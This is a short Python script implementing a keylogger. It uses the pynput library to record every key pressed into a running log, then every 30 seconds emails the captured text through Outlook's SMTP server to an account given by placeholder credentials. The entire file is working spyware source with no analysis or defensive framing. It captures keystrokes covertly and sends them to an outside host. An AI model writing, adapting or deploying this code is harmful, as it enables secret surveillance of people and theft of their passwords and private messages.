import pynput.keyboard
import smtplib
import threading
log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    except:
        pass

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.outlook.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)


def thread_function():
    global log
    send_email("testmail@outlook.com", "passwordhere!", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

#threading
with keylogger_listener:
    thread_function()
    keylogger_listener.join()